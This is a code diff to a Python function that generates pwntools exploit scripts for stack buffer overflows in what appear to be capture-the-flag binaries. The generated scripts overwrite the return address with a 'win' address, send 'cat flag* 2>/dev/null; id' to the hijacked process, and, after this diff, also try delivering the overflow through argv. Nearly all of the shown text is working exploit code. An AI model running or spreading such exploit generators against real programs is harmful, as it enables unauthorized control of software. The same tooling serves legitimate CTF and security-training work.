@@ -190,6 +190,10 @@ def _emit_script(path: str, info, win_addr: int, offset: int) -> str:
         OFFSET, WIN = {offset}, {win_addr:#x}
 
         def attempt(chain):
+            # A target that never reads stdin at all (e.g. its overflow comes
+            # from argv instead) closes its stdin pipe almost immediately, so
+            # sendline() itself can raise BrokenPipeError, not just EOFError
+            # on the later read.
             p = process(exe)
             try:
                 p.sendline(chain)
@@ -198,7 +202,25 @@ def _emit_script(path: str, info, win_addr: int, offset: int) -> str:
                 except Exception:
                     pass
                 data = p.recvall(timeout=5)
-            except EOFError:
+            except (EOFError, OSError):
+                data = b""
+            finally:
+                p.close()
+            return data
+
+        def argv_attempt(chain):
+            # Some targets only read the overflow from argv, not stdin (e.g.
+            # strcpy(buf, argv[1])). A single argv element is a C string: it
+            # can't carry a NUL byte, so if WIN's own bytes contain one (any
+            # non-PIE address usually does, since the top bytes are zero),
+            # this only writes the payload up through the last non-NUL byte
+            # and relies on whatever is already on the stack past that point
+            # being zero too. Best-effort, not guaranteed to fully land.
+            arg = chain.split(b"\\x00", 1)[0]
+            p = process([exe, arg])
+            try:
+                data = p.recvall(timeout=5)
+            except (EOFError, OSError):
                 data = b""
             finally:
                 p.close()
@@ -214,13 +236,19 @@ def _emit_script(path: str, info, win_addr: int, offset: int) -> str:
                 pass
         if not FLAG.search(out):
             p = process(exe)
-            p.sendline(flat({{OFFSET: p{bits}(WIN)}}))
-            p.sendline(b"cat flag* 2>/dev/null; id")
             try:
+                p.sendline(flat({{OFFSET: p{bits}(WIN)}}))
+                p.sendline(b"cat flag* 2>/dev/null; id")
                 out += b"\\n" + p.recvall(timeout=3)
-            except EOFError:
+            except (EOFError, OSError):
                 pass
-            p.close()
+            finally:
+                p.close()
+        if not FLAG.search(out):
+            try:
+                out += b"\\n" + argv_attempt(flat({{OFFSET: p{bits}(WIN)}}))
+            except Exception as e:
+                out += f"\\n[argv attempt] {{e}}".encode()
         sys.stdout.buffer.write(out)
     '''
     return textwrap.dedent(body).strip() + "\n"
